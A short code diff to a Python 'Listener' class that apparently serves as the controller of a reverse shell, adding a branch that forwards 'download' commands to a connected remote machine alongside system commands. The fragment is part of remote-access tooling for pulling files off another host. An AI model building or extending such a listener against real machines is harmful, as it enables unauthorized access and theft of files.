@@ -44,8 +44,10 @@ class Listener:
                     print("Dinleme durdu")
                     return exit()
             
+            if command.startswith("download "):
+                self.reliable_send(command)
 
-            if self.is_system_command(command) or command.strip() == "download ":
+            elif self.is_system_command(command):
                 #self.connection.send(command.encode("utf-8"))
                 # self.reliable_send(command.encode("utf-8"))
                 self.reliable_send(command)
